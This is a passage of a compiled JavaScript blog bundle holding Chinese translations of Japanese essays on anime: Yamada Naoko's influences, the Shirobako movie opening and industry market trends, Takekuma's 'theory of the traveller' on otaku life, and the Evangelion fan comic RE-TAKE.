相當強的影響，在創作風格上也相當地相似，兩位都是女性性相當強的作家，這並不是拘泥於性別上的意思，在這兩位女性之間共通的「堅強」，並不是實際上的能力或是男性般的壯碩，而是面對人際關係裡所產生的感情的能力，面對人生的能力，例如思春期的問題，會想裝扮自己，並不是希望讓其他人覺得自己很可愛，而是為了理解自己究竟是什麼人。</p>\n<p>山田尚子與 HADZIHALILOIC 的作品有非常多的相似點，從美術、空間表現到服裝設計，在這些要素上再加上楊德昌、COPPOLA、小津、PARAJANOV 和 HADZIHALILOIC 就是山田尚子。</p>\n<p>偉大的監督山田尚子是這樣誕生的，不論是多麼偉大的監督都有其源流，而我個人認為有些東西是知道了其源流後，才能夠瞭解的，尤其像是山田尚子，若你只是「觀看」就太浪費了，你應該要「傾聽」並去追尋她的起源。</p>\n","date":"2019-01-19T06:46:33.000Z","excerpt":"","printDate":"January 19, 2019","printReadingTime":"1 min read"};

var route_18 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod32
});

var Mod33 = {"title":"【譯】《劇場版 SHIROBAKO》的片頭所展示出的動畫業界轉變","slug":"ACG-the-opening-of-shirobako-movie","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/nejimura89/n/nf9d565d18ddf\">https://note.com/nejimura89/n/nf9d565d18ddf</a></p>\n<hr>\n<p><strong>※本文內容會有提及《劇場版 SHIROBAKO》的主劇情與結局的相關內容，請在意劇情透露的人注意。</strong></p>\n<p>《劇場版 SHIROBAKO》。</p>\n<p>我是在沒看過電視版的情況下去看的，非常好看。</p>\n<p>完全地迷上了這部作品，之後也回去找了電視版來看。</p>\n<p>回去追的時候我注意到，<strong>劇場版的開頭，是對電視版片頭的自我致敬</strong>。</p>\n<p>這段開頭的演出真的相當精彩，所以今天我想來聊聊。</p>\n<p>電視動畫《SHIROBAKO》和《劇場版 SHIROBAKO》的開頭。</p>\n<p>電視動畫《SHIROBAKO》在描寫完學生時代的宮森後，時間跳至現職制作進行，前往回收原畫的宮身的姿態。故事由停在交叉口紅綠燈前的車開場，車內收音機裡的動畫電台，隨著車輛的發動一同播出動畫歌曲=本作的片頭曲，鏡頭往上拉至夜晚的天空，顯示本作的標題…。</p>\n<p>而《劇場版 SHIROBAKO》由吉祥物角色米姆基和蘿蘿介紹完動畫版的故事大綱，也和電視動畫一樣從宮森開著車停在交叉口處開始。聽著動畫電台，與發動一同播放的片頭曲，夜空上的標題…。</p>\n<p>片頭裡演出的差異所表現出的。</p>\n<p>乍看之下這兩部片頭用的是一樣的演出，不過這段演出裡些許不同的地方，正是本作的有趣之處。</p>\n<p>動畫版的車內收音機聊的是，現在的動畫業界多麼豐饒，播放的動畫越來越多，觀眾的觀看速度已經跟不上，劇場版的車內收音機的話題，一轉成了光碟賣不出去，業界正走向夕陽。</p>\n<p>以及在動畫版內有請了來賓來，劇場版則是連電台也沒有錢能夠請來賓。</p>\n<p>相較動畫版電台播放的歌曲是快速而正向的，劇場版的則是沉著並且「真沒辦法唉呀唉呀」，雖然不完全負面卻是有些消沉的歌曲。</p>\n<iframe width=\"560\" height=\"315\" title=\"shirobako movie opening\" src=\"https://www.youtube.com/embed/YtGSzDeTdBM?start=335\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n<p>這便是在<strong>暗示著，電視動畫版裡接下來要發生的，是激動的動畫業界故事，劇場版裡則是武藏野動畫的經營不善的演出手法</strong>。</p>\n<p>而這其實同時也是不單指作品內的故事發展，也<strong>暗指動畫業界裡「某件事」的演出</strong>。</p>\n<h2 id=\"2014→2020-不斷變化的動畫業界\">2014→2020 不斷變化的動畫業界</h2>\n<p>這段<strong>《劇場版 SHIROBAKO》的片頭，是在呈現日本動畫業界狀況的演出，並且與現實的動畫業界有所關聯</strong>。</p>\n<p>現實的動畫業界市場不是蒸蒸日上嗎？</p>\n<p>有些人應該會這樣覺得，的確正是如此。</p>\n<p>根據一般法人集團日本動畫協會所發表的動畫業界報告，電視動畫《SHIROBAKO》播放當年的 2014 年，動畫業界的市場規模有 1 兆 6361 億，最新發表的 2018 年更來到 2 兆 1814 億元，僅過 4 年就成長了 1.5 倍，每年都有成長的傾向。</p>\n<p>但增加<strong>量</strong>本身的傾向則是在減少著，2017 年相較 2018 年僅有細微的增加，<strong>而 2019 年就更難預期能得到比前一年更高的數字了</strong>。</p>\n<p>每年的動畫製作量也是以 2016 為巔峰後就開始減少。2016 年和 2018 年所製作的動畫量就相差了將近 30 部。</p>\n<p>這正好就是電視動畫版《SHIROBAKO》播出當時，動畫業界就要走向巔峰的成長期，而《劇場版 SHIROBAKO》的故事起點 2019 年初，「動畫業界接下來還走得下去嗎？」的停滯不穩的狀態，所表現出的真實的空氣感。</p>\n<h2 id=\"挑戰劇場版製作是必然的選擇？\">挑戰劇場版製作是必然的選擇……？</h2>\n<p>而《劇場版 SHIROBAKO》的故事推進的方向，也能說是踏襲於實際的市場。</p>\n<p>在開始走下坡的動畫產業裡，也有一些如串流服務正悄悄爬升的趨勢存在。而這些<strong>爬升趨勢之一的，就是電影版動畫</strong>。</p>\n<p>根據一般法人社團 日本電影製作者連盟所發表的內容，2019 年的日本國內電影市場有 2611 億 8000 萬日圓，相較前一年有 117.4% 的相當優秀的成長。</p>\n<p>雖然動畫電影也和電視動畫一樣在 2016 年迎來集數的巔峰，但從製作分數來看電影動畫在 2018 年仍和巔峰時相去不大，能看出其亮眼的成績。</p>\n<p>也就是以業界趨勢來說，製作電影版是<strong>有搞頭</strong>的。</p>\n<p>《劇場版 SHIROBAKO》裡製作電影版的理由，是因為第一承包的公司放棄工作，使得宮森必須製作劇場版這樣有些負面的原因。但站在市場考量，宮森選擇製作電影版，在經營上也是正確的。</p>\n<h2 id=\"武藏野動畫的未來光明無邊？\">武藏野動畫的未來光明無邊？</h2>\n<p>而講完這些實際的市場後，在電影結尾能看到公司內的白板上寫滿許多動畫製作的預定註記，可說是宮森就職的武藏野動畫，成功地以製作電影版作品東山再起了。美好的 HAPPY END。</p>\n<p>宮森和武藏野動畫的伙伴們，從此過著幸福美滿的…雖然我很想這樣說，但現實是沒有這麼美好的。</p>\n<p>現在因為新型冠狀病毒的影響，許多電影作品都公開了上映延期的消息。在寫下這篇文章的 2020 年 3 月 5 號時《007/NO TIME TO DIE》和《杜立德》也宣布了延期上映。2020 年連日本的電影市場本身也受到了巨大的影響。</p>\n<p>即使搭上了爬升趨勢，仍然不能大意。沒有人知道會發生什麼，在《劇場版 SHIROBAKO》之後宮森也會再遇到「真沒辦法唉呀唉呀」的問題吧。但我也希望宮森能跨越跨越這波瀾，不抹滅製作動畫的熱情之火，努力地說出「來製作動畫吧」。</p>\n","date":"2020-05-10T19:29:29.000Z","excerpt":"","printDate":"May 10, 2020","printReadingTime":"1 min read"};

var route_19 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod33
});

var Mod34 = {"title":"【譯】關於「旅人的理論」","slug":"ACG-theory-of-traveller","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.netcity.or.jp/otakuweekly/PRE0.9/TR8.html\">「旅人の論理」について</a></p>\n<hr>\n<h2 id=\"●「旅人の論理」について（１）\">●「旅人の論理」について（１）</h2>\n<blockquote>\n<p>ここからは、岡田さんが『イイワケ』で新たに書かれたことで、気の付いた部分に私なりのコメントを添えていきたいと思います。引用は最低限にとどめますので、読者はもう一度岡田さんの文章を読み直してから、以下に進まれることをお願いします。\n? まずは「ハマる」ということについて。</p>\n</blockquote>\n<p>這篇文章是，我想對於岡田先生在『藉口』裡新增的部份，所在意的地方加上自己的評論。由於只會有最低限度的引用，請讀者先讀過岡田先生的文章後，再繼續閱讀本文。</p>\n<blockquote>\n<p>【僕は、何かに「ハマる」事、「ハマれる」事は人生にとって、素晴らしいことだと考えている。（中略）が、ハマっぱなしなヤツもイマイチ信用できない。はまっている最中の人間は、恋愛中の人間と同じで、冷静に廻りが見れない。（中略）肝心なことは、思い切りハマッて、その後、そこから帰って来ることだ。そうすることで初めて、色々なものが見えてくる。その見えてくるものは、ハマッている最中には決して見えなかったものだし、ハマらない人にも、永久に理解できないものなのだ】\n【僕は、竹熊さんとこの「ハマッて、帰ってくる」ことの大切さに関して、何度も話し合った。竹熊さんも、その時は同意してくれていたと思う】（以上『イイワケ』より）</p>\n</blockquote>\n<p>【我認為「沉迷」於什麼東西，和「能夠沉迷於其中」，在人生裡是非常美好的。(中略)然而，過度熱中的傢伙是不能信任的。正沉迷於其中的人，和在戀愛的人是一樣的，沒辦法冷靜下來觀看四周。(中略)重要的是，徹底地沉迷，之後，從那裡回來。這樣才能開始看見許多東西。而這時所看見的東西，是在所沉迷時絕對看不見的，而也是不會沉迷的人，永遠無法理解的】</p>\n<p>【我和竹熊先生討論了好幾次這種「沉迷，並且歸來」的重要性。而竹熊先生，那時候也同意了我】(以上引用自『藉口』)</p>\n<blockquote>\n<p>この文章を読んでいて、ふと「ハマッて、帰る」という言い方を、岡田さんと私とが果たして同じ文脈で使っていたのか、疑問に思えてきました。それというのも、私が『私とハルマゲドン』で書いた「旅人の論理」（これ自体は文化人類学者の西江雅之氏の受け売りなのですが）からは、決して（通常の意味での）「どこかに帰る」という発想は出てこないはずだからです。「旅人の論理」とは、自由な精神状態を求めるために、常に「旅人」の視点で日常生活を送ろうというひとつの考え方、ないしは態度です（具体的な旅の意味ではない）。旅人とは常に別の場所へ「おもむく」存在なのであって、どこかに「帰って」しまったら、それはもはや旅人ではなくなるわけです。</p>\n</blockquote>\n<p>讀了這篇文章，突地對於「沉迷，並且歸來」這樣的講法，岡田先生和我所使用的文脈究竟是一樣的嗎，產生了疑問。要說為什麼的話，我在『我與哈米吉多頓』裡所寫的「旅人的理論」(雖然這個東西原本是從文化人類學者的西江雅之先生借來現學現賣的)裡面，絕對(在通常的意義上來說)是不會出現「回到某處去」的想法的。所謂的「旅人的理論」，是為了追求自由的精神狀態，時常以「旅人」的視點過著日常生活的一種思考模式，亦或者是態度(並不是具體上的旅行的意義)。旅人是種持續在「前往」其他地方的存在，若是「回歸」到了某個地方，那就已經不是旅人了。</p>\n<blockquote>\n<p>私が「ハマッて、帰る」と言ったとしたら、それはたぶん「いっさいのしがらみや、価値観から切り離した、素の自分自身に帰る」という意味で使っていたんだと思います。岡田さんの「帰る」という言葉も、この意味で使われているのでしょうか？ それなら話はわかるのですが。\nまた僕には岡田さんが「旅人の論理」に言及された部分にも、少し引っかかるものを感じます。</p>\n</blockquote>\n<p>我若是說了「沉迷，並且歸來」，我想那大概是以「從所有的牽連、價值觀裡離脫，回到最樸素的自己」這樣的意思所使用的。岡田先生的「回歸」，也是當成這樣的意思嗎？若是這樣的話就能理解了。</p>\n<p>以及我對於岡田先生提及「旅人的理論」的部份，也覺得有些在意。</p>\n<blockquote>\n<p>【僕は、この『私とハルマゲドン』を読んで、この中に書かれている「旅人の論理」にものすごく感動した。その中に、僕はオタクの生き方、究極の美学を感じたからだ。\n旅人としてその街へ行き、その街の価値観を受け入れる。受け入れるけれども、その一員になりきれず、結局は街を去る。価値観は、最終的には完全に一致せずに、また街を出ていくのは宿命なのだ。これは、オタクと作品とのかかわり合いを、見事に表現している。いや、現代社会での知の在り方、生き方指南を言い尽くしている。少なくとも僕には、そう読めた】（『イイワケ』）</p>\n</blockquote>\n<p>【我看了這本『我與哈米吉多頓』，對於裡面所寫的「旅人的理論」非常地感動。我在裡面感受到了身為御宅族的生活方式，以及究極的美學。</p>\n<p>化為一名旅人到街道上，接受街道裡的價值觀。雖然能夠接受，卻無法成為裡頭的一員，最後離開了街道。價值觀宿命性地終究無法完全一致，並且必須離開街道。這精綻地表現了御宅族與作品間的關聯性。不，這道盡了現代社會裡知性的存在方式、生存方式的指南。至少在我讀起來是如此】(『藉口』)</p>\n<blockquote>\n<p>完全に間違った要約というわけではないのですが、僕が考える「旅人の論理」は、ちょっと違います。揚げ足とりめいてしまって心苦しいのですが、たとえば「その一員になりきれず」とか「価値観は、最終的には完全に一致せずに、また街を出ていくのは宿命なのだ」という悲壮感あふれる解釈は、「旅人の論理」にふさわしいものとは思えません。</p>\n</blockquote>\n<p>雖然這段概述並不是完全錯誤，但和我所想的「旅人的理論」有些不同。這樣指出文內的錯誤非我所願，例如「無法成為裡頭的一員」或是「宿命性地價值觀終究無法完全一致，並且必須離開街道」這種充滿悲壯感的解釋，我認為與「旅人的理論」並不相符。</p>\n<blockquote>\n<p>その一員になりきれないのも、また、価値観が完全に一致しないのも、旅人にとっては当たり前のことです。だからこそ、多少の価値観の不一致を大目に見て、それを受け入れることができるのではないでしょうか。なぜそれが可能かというと、旅人とは嫌になればすぐにその街を出ていける存在だからです。反対に、価値観の不一致が大目に見られる範疇に止まるのであれば、その街に何十年とどまったっていいわけです。</p>\n</blockquote>\n<p>無法成為其中的一員，或是，價值觀無法完全一致，對於旅人來說是理所當然的事。所以正是如此，才會寬容地看待一定程度上的價值觀差異，因而能夠接受。要說為什麼這是可能的話，因為旅人是只要覺得厭惡就能立即離開街道的存在。反過來說，如果對於價值觀的不一致的是在容忍程度的範圍內，就能夠在那條街道上待上數十年。</p>\n<blockquote>\n<p>人間一人一人皆違うのですから、価値観が一致しないのは当たり前です。それを前提としたうえで、理解不能の他者とどうやってつきあっていくかというひとつの考え方が、旅人の論理と言えるのかもしれません。それは孤独な生き方かもしれませんが、その孤独を受け入れられずに「自分と同じ他人」を幻想してしまうと、それこそ「悪ハマリ」、つまり安易な依存や排除の構造に陥るのだと思います。</p>\n</blockquote>\n<p>每個人都是不同的，價值觀的不一致是理所當然的。而以這點為前提，要如和與無法理解的他人一同相處下去的其中一種思考方式，可以說就是旅人的理論。也許這是種孤獨的生活方式，但若是無法接受這份孤獨而幻想「和自己相同的他人」，這才是「惡質沉迷」，也就是陷進了安逸的依賴和排除的構造裡。</p>\n<blockquote>\n<p>旅人が「街を出よう」と決意するのは、けっして岡田さんの言うように「価値観が一致しないから」ではなく、自分のいる場所で、「価値観の一致を強要する気配」が忍び寄った瞬間なのだと思います。そうなったら、そこを出ていくことに彼はなんの躊躇もいらないでしょう。普通は孤独が恐ろしくて街を出られないわけですが、旅人にとっては孤独は「本来の自分」、そもそもの前提にすぎないからです。そうして、別の街へ行くだけの話です。私と岡田さんの「旅人の論理」の解釈は、似ているようで違います。おわかりになられたでしょうか。うまく説明できていたらいいのですが。</p>\n</blockquote>\n<p>旅人會下定決心「離開街道」，絕對不是像岡田先生所說的「因為價值觀不一致」，而是在自己所待的地方，「強迫要求價值觀一致的氣息」開始潛入的瞬間。若是變得如此，他對於離開此處不會有任何一絲的猶豫吧。普通來說會因為害法孤獨而無法離開街道，但對旅人來說孤獨是「原本的自己」，也就是回歸初衷的前提。僅是之後，再前往其它街道而已。我與岡田先生的「旅人的理論」的解釋，看似有些相似但是不同的。這樣是否能夠理解呢。希望這樣的說明是足夠的。</p>\n<h2 id=\"●「旅人の論理」について（２）\">●「旅人の論理」について（２）</h2>\n<blockquote>\n<p>以下は参考として、かなり長くなりますが、「旅人の論理」を知らない方のために拙文から抜粋してみたいと思います。</p>\n</blockquote>\n<p>以下為了不曉得「旅人的理論」的讀者，做為參考從拙著裡擷取了一部份文章出來，文章會有些長。</p>\n<blockquote>\n<p>【人間は二言目には自由を求めるが、自由ほど恐ろしいものはない。自由の代償は孤独だからだ。究極の自由状態…… たとえば、南の島でロビンソン・クルーソーになることを想像すればいい。自由かもしれないが、そんな孤独におれは耐えられない。\n人間が生活するためには、結局なんらかの組織に依存する仕組みになっている。完全な自由（わずらわしい人間関係からの解放）なんてものは、幻想だということだ。（略）\nその頃、おれは東京芸大によく遊びに行っていた。（略）そのとき偶然ながら、文化人類学者・西江雅之氏の授業を聴いたのである。（略）</p>\n</blockquote>\n<p>【人們總是會將追求自由掛在嘴上，但沒有比自由更恐怖的東西了。因為自由的代價就是孤獨。究極的自由狀態……例如說，想像成為漂流在南方島嶼上的魯賓遜·克魯索。也許那是自由，但我無法忍受那樣的孤獨。</p>\n<p>人類為了生活，終究必須活在依附於某個組織裡的結構中。完全的自由(從令人煩厭的人際關係裡脫離)，只是種幻想。(略)</p>\n<p>那時，我很常到東京藝大去玩。(略)而偶然地，我聽了堂文化人類學者．西江雅之老師的課。</p>\n<blockquote>\n<p>「あなたたちは芸術家の卵だから、自分を取り巻いている鉄格子のような価値観から逃れて自由になりたいと思っているでしょう。（略）では、その檻を出たらどうなるのでしょうか。そこにはきっとまた別の檻があります。この檻がすなわち文化です。人間社会というのはジャングルジムのように文化という檻が無限に連鎖している。人間が人間である以上、そこから脱出することは不可能です。では、そこで自由を求めるならどうすればいいのか。唯一、人間に許された自由を享楽する方法は、そのいくつもの檻と檻の間を行き来することです。檻から脱出することは無理でも、檻から檻に移動することは可能です。つまり、旅人になるのです」</p>\n</blockquote>\n<p>「你們是將成為藝術家的雛鳥，所以會想從如鐵籠般將自己困住的價值觀裡逃離獲得自由。(略)那麼，離開了這道鐵籠後呢。那裡又會是另一道鐵籠。這個鐵籠就是文化。人類社會就像是立體格子鐵架一樣的文化鐵籠無限連鎖著。只要人類身為人類，是無法從裡頭逃脫的。那麼，想在裡面追求自由的話該怎麼做好呢。人類唯一被允許能夠享受自由的方法，就是在這數多的鐵籠裡來回移動。雖然沒辦法自鐵籠裡逃出，從鐵籠移動到另一個鐵籠是可能的。也就是，成為旅人。」</p>\n<blockquote>\n<p>これこそは以後のおれに決定的な影響を与えた「旅人の論理」である。\nつまり、旅人というのは、その土地の因習から自由である。どんな土地、どんな世界にもルールというものがあるが、その世界に生きる限り、おれたちはいやでもそこのルールを受け入れて生きなければならない。</p>\n</blockquote>\n<p>這正是之後給予我決定性影響的「旅人的理論」。</p>\n<p>也就是說，所謂的旅人，是因為身處土地上的風俗而自由的。不論是什麼樣的土地、什麼樣的世界都有著自己的規則，只要活在那個世界裡，我們即使不願意也必須要接受規則而活下去。</p>\n<blockquote>\n<p>しかし、唯一自由な存在があるとすれば、それは旅人だ。これは「旅の恥は掻き捨て」という意味ではない。つまり旅人だからこそ、その土地のルールを素直に（略) 受け入れることができる。なぜなら、いやになったら、彼は別の土地に移動できることができるからだ。だから、旅人には退屈もないのである。\nおれは、ここで本当の旅の話をしているのではないよ。</p>\n</blockquote>\n<p>但若要說有著唯一是自由的存在，那就是旅人。這並不是「出門在外不怕見怪」的意思。而是說正因為身為旅人，可以直率地(略)接受土地上的規則。要說為什麼的話，若是感到厭煩，他能夠移動到其他的土地去。所以，旅人是不會感到厭倦的。</p>\n<p>我在這裡所說的，並不是真正的旅行。</p>\n<blockquote>\n<p>たとえば、西江雅之さんは実際に世界中を飛び回るプロの旅人でもある。が、あの人の異常なところは、日本で生活していてもアフリカにいるのと変わらないことだ。西江さんはデパートで化粧品のデモンストレーションなどをやっていると、一時間でも見ていて飽きないのだという。そのときの彼の目は、アフリカのなんとか族の化粧を見る目とまったく変わらないのだ。驚くべき才能ではないか。\nこの目があれば、家庭や、学校や、会社でも、退屈することなんてないだろう。つまり、その時のおれやあなたは、家庭や、学校や、会社に「旅をしている」わけだ。そりゃ楽しいぞ、旅なんだから。\nこの思想は、オウム真理教問題や、その奥に潜む「大人にならない子供」問題のひとつの解決策になるのではないかと、おれは考えている（略）。</p>\n</blockquote>\n<p>例如說，西江雅之先生也是位實際地在世界上四處飛航的職業旅人。但，那個人異於常人的地方是，他在日本的生活和在非洲時是一樣的。西江先生在逛著百貨公司的化粧品銷售展覽時，即使逛上一小時也不會感到厭倦。那時他的眼神，和在看著非洲的族人化粧的眼神是一樣的。這是種令人驚訝的才能。</p>\n<p>只要有這樣的眼神，對於家庭、學校、公司，都不會感到厭倦吧。也就是說在那時的我或是你，是在家庭、學校和公司裡「旅行」著。那當然有趣了，因為這是旅行啊。</p>\n<p>我在想著，這種思想，會不會是奧姆真理教，和潛藏於裡頭「無法成為大人的孩子」的問題的解決策之一(略)。</p>\n<blockquote>\n<p>オウム真理教は遠からず崩壊するのだろう。その時、路頭に迷った信者たちを、どのように「こちらの社会」に受け入れるべきか、いまから頭を悩ませている人たちがいる。ご苦労さんとも思うし、大きなお世話だとも思う。あっちの世界も、こっちの世界も、そこにしがみつく限り、日常という名の退屈でしかない。\nただ旅人のみが退屈からまぬがれるのだ。</p>\n</blockquote>\n<p>奧姆真理教在不久之後就會崩壞吧。那時，迷惘的信徒們，要如何接受「這邊的社會」呢，也有從現在就在煩惱著的人。既覺得他們真是辛苦了，也覺得多管閒事。不管是那邊的世界，還是這邊的世界，只要緊緊抓著不放，那就只是名為日常的沉悶。</p>\n<p>只有旅人能夠從沉悶裡逃開。</p>\n<blockquote>\n<p>だから信者は、こっちの世界に「帰る」必要なんてさらさらない。オウムの諸君は、ただこちらに「旅して」くればいいんだ。で、旅人の目でみれば、こっちの世界もまんざら捨てたものじゃないことが見えてくるかもしれない。そうなりゃ、あくまで旅人としてこの世界を「愛すれば」いい。それはそれで素敵なことではないかい。\nハルマゲドンなんかとっくの昔に起こっているんだよ。だから「帰ってくる」必要なんかない。おれたちにはもともと「帰る」場所なんてないんだから。】（『私とハルマゲドン』）</p>\n</blockquote>\n<p>所以對信徒來說，是完全沒有必要「回到」這邊的世界的。奧姆的各位，只需要「旅行」到這邊來就行了。然後，用旅人的眼光來看，或許這邊的世界看來也不會那麼地糟糕。這樣的話，只要以旅人的身份去「愛」這個世界就行了。這樣也是很棒的吧。</p>\n<p>哈米吉多頓早就發生了。所以沒有「歸來」的必要。因為我們早就沒有「回歸」的場所了。】(『我與哈米吉多頓』)</p>\n<blockquote>\n<p>補足すれば、「旅人の論理」が真に機能するためには、「個人主義」の確立が大前提になるのだと思います。個人主義というものは、決して他者を拒絶する唯我独尊思想ではなく、むしろ他者との関係をクールな「排斥」でもホットな「依存」でもない形で、バランスよく行おうとする態度でしょう。そこに私は「オタクとしての生き方」の理想形を見いだしたいわけです。</p>\n</blockquote>\n<p>而再補充一點，為了要讓「旅人的理論」能夠真正地發揮機能，我認為「個人主義」的確保會成為大前提。所謂的個人主義，絕對不是拒絕他人唯我獨尊的思想，反而是在與他人的關係裡不採取冷酷的「排斥」亦不是熱情的「依賴」，而是良好的平衡形式的態度。並且我希望能在裡面發現「身為御宅族的生存方式」的理想形態。</p>\n<blockquote>\n<p>私の見たところ、多くのオタクは「世間」に対して「我関せず」の態度を装う個人主義者のように（一見）見えるものの、その実オタク同士でも「話のわからない」連中を排斥し、「話の分かる」相手とはベタベタに「依存」しあうという関係がはびこっているように思えます。まあ、これはオタクに限りませんね。一般的に人間社会はそうなんだと思います。私だって「排斥」や「依存」とは無縁ではない。ふと気が付くと、私も無意識のうちに誰かを正当な理由もなく排斥していたり、過剰に依存していることに気が付いて、自己嫌悪に陥ることの繰り返しです。</p>\n</blockquote>\n<p>就我看來，很多御宅族(乍看之下)看似對於「社會」採取「與我無關」的個人主義者態度，實則即使同是御宅族也會排斥「無法溝通」的群體，而去「依賴」「能夠溝通」的對象之間暢所欲言的關係性。不過，這也不是僅限於御宅族。我想一般來說人類社會就是這樣。我也不是和「排斥」與「依賴」無緣。爾時忽地回首，發現到我也在無意識之中毫無正當理由地去排斥了誰，過度地依賴著誰，而陷入自我厭惡的迴圈裏。</p>\n<blockquote>\n<p>その意味で「個人主義」の確立は、現在の竹熊にはあくまでも努力目標にすぎません。私だって孤立は怖いですからね。だからある程度の「排斥」や「依存」はやむを得ないが、せめてそれが過度になっていないか、時々チェックすることが必要なんだと思います。さもなきゃ「旅人の論理」もへったくれもないでしょう。</p>\n</blockquote>\n<p>在這點意義上「個人主義」的確保，對現在的竹熊來說也仍是個努力目標。我也很害怕孤立。所以某個程度上的「排斥」和「依賴」是無可奈何的，不過我想會有必要時時檢查是不是過了頭。否則「旅人的理論」也沒什麼意義了。</p>\n","date":"2019-01-22T06:53:00.000Z","excerpt":"","printDate":"January 22, 2019","printReadingTime":"1 min read"};

var route_40 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod34
});

var Mod35 = {"title":"【譯】關於 RE-TAKE 的小思考","slug":"ACG-thought-about-re-take","html":"<p>文章來源：<a target=\"_blank\" rel=\"nofollow\" href=\"http://d.hatena.ne.jp/LASism/20060814\">http://d.hatena.ne.jp/LASism/20060814</a></p>\n<hr>\n<p>《RE-TAKE》是由同人社團「Studio KIMIGABUCHI きみまる」所發佈的《新世紀福音戰士》二次創作漫畫作品。</p>\n<p>在 2004 年 8 月發行第 1 集，之後在 2004 年 12 月發行第 2 集、2005 年 8 月發行第 3 集、2005 年 12 發行外傳性質的第 0 集，並完結於 2006 年 8 月發行的第 4 集。</p>\n<p>以下含有劇情揭露。</p>\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ZT9sBQFNm8w\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" title=\"re-take mad\" allowfullscreen></iframe>\n\n<p>在《新世紀福音戰士》的二次創作作品裡，很常見到這種類型的故事走向——以碇真嗣為主的登場人物們，會保持在原作結束的時間點所擁有的記憶，回到原作的某個時間點，活用這份記憶回避悲劇。這種作品通稱為『逆行物』。</p>\n<p>而走這種所謂的『逆行物』路線的二次創作，在《新世紀福音戰士》以外的作品社群中並不常見。我認為這是因為《新世紀福音戰士》以一種背叛了大多粉絲的期待的形式結束。無法容忍《新世紀福音戰士》結局的粉絲，透過製作『逆行物』的二次創作作品，間接地對原作進行修正，試圖將其改變成自己能夠接受的形式。換個角度來說，《新世紀福音戰士》可說是部能夠讓粉絲採取如此行動的高沉浸度作品。</p>\n<hr>\n<p>這部作品《RE-TAKE》也是這種『逆行物』的作品。</p>\n<p>以及，正是因為存在著如此多的二次創作，才能成立的作品。</p>\n<p>這點能夠從第 4 集中途登場，自稱為「神明大人」的少女與明日香的對話裡推測得知。</p>\n<p>在此明日香這樣說道：</p>\n<blockquote>\n<p>「那傢伙引發第三次衝擊，從自己的世界裡逃走了」\n「因此誕生的無數世界」\n「對真嗣來說是舒服的美夢世界」\n「例如在第三次衝擊後，所有人都復活、快樂地生活著的世界」\n「不會有人責怪真嗣，在不知何時已然復興的第三新東京市裡，我完全迷上真嗣的世界」\n「我反而被狠狠譴責，定下罪過的世界」\n「為了讓那傢伙的心能得到原諒、獲得救贖而創造出來的世界」\n「不會有使徒出現的世界」\n「彌補那傢伙昏暗的學生生活的世界」\n「不會有人死去、不會有人受傷」\n「不知為何我和 First 在爭奪那傢伙的世界」\n「這些世界的舞台，自江戶時代直到未來時代，並非全是同一的世界」\n「即使如此，這些世界群仍然擁有一條絕對規則」\n「在所有的世界裡，我們一定會相遇」\n「毫無例外」\n「會落入戀情、互相傷害」\n「建築起深厚的關係」\n「盡是以真嗣為中心所構成的世界——」\n「這正是唯一而絕對的……規則」</p>\n</blockquote>\n<p>看過一定程度以上數量的《新世紀福音戰士》二次創作的人，大概會注意到明日香在這裡所舉出的世界，都是某部二次創作作品。也都是在二次創作裡很常見的形式。</p>\n<p>所以，明日香在這裡所說的「真嗣」，實則是在指稱進行二次創作的作者。指摘這些作者們無法接受《新世紀福音戰士》本篇的內容，而選擇創作自己能夠接受的世界＝二次創作作品。</p>\n<p>於上述的對話後，明日香接著這樣說道。</p>\n<blockquote>\n<p>「真是…可笑啊」\n「明明真正的我們——」\n「仍然一直在那裡」</p>\n</blockquote>\n<p>「那裡」指的是原作的最後一幕，紅海的海灘上。</p>\n<p>也就是說，不論創作了多少二次創作作品，都無法成為本篇的替代品。</p>\n<p>當然，《RE-TAKE》並不是在否定二次創作 (不然就成了自我否定。)，自稱「神明大人」的少女說了「即使如此真嗣仍會戰鬥」、「因為他知道戰鬥這件事本身就有意義」，明日香所說的確實是對的，但這個行為本身亦非毫無意義。</p>\n<p>之後，明日香發現有錯的不只是真嗣，並前往救援真嗣，故事邁向尾聲，然而在《RE-TAKE 0》裡，明日香看著「以前的」明日香細語道：</p>\n<blockquote>\n<p>最後包含你在內的所有人類都將滅亡\n只有真嗣一個人會活下來…\n這就是這個世界註定的結局\n拒絕這樣的結局的真嗣，會再次重新構成世界…並且不斷重覆\n不曉得由誰所策畫的…永遠地重覆著、無限擴展的世界\n我並不曉得「這裡」是首次被構成的世界，\n亦或是已被構成數億次之後的世界，\n而意識到這件事也沒有意義</p>\n</blockquote>\n<p>也就是為了讓明日香知道自己也有過錯，去經驗這些多數「被構成的世界」的時間是必要的。以及在《RE-TAKE》誕生之前，已經有多數的二次創作先行存在，這些作品對於《RE-TAKE》的誕生來說是不可或缺的。</p>\n<p>若要提及作品之外的事情來做解釋，《RE-TAKE》的原形《ぼくのエヴァンゲリオン 2》後記裡，きみまる有著這樣的發言。</p>\n<blockquote>\n<p>在完稿之後，我想去找找《EVA》的小說網站，補完我的心。</p>\n</blockquote>\n<hr>\n<p>然後，明日香的救援，以及之後真嗣下定決心，結束了世界的循環，場景回到最初的紅海岸邊。真嗣的手仍在明日香的脖子上，明日香手搭在真嗣的臉頰邊撫摸著，然而真嗣臉上驚訝的表情，並不像是真心想要緊掐對方的脖子，明日香的眼神也不像原作帶有種蔑視感。可以認為是原作的這 2 